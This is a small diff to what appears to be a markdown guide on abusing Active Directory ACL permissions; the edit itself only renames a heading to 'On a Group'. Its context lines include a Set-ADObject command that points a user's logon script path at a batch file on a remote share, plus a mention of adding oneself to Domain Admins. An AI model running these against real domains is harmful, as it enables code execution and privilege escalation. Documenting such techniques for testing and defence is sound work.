@@ -161,7 +161,7 @@ An **Access Control List (ACL)** is a collection of Access Control Entries (ACEs
   Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.bat"
   ```
 
-### Group
+### On a Group
 
 This ACE allows us to add ourselves to the Domain Admin group :
 
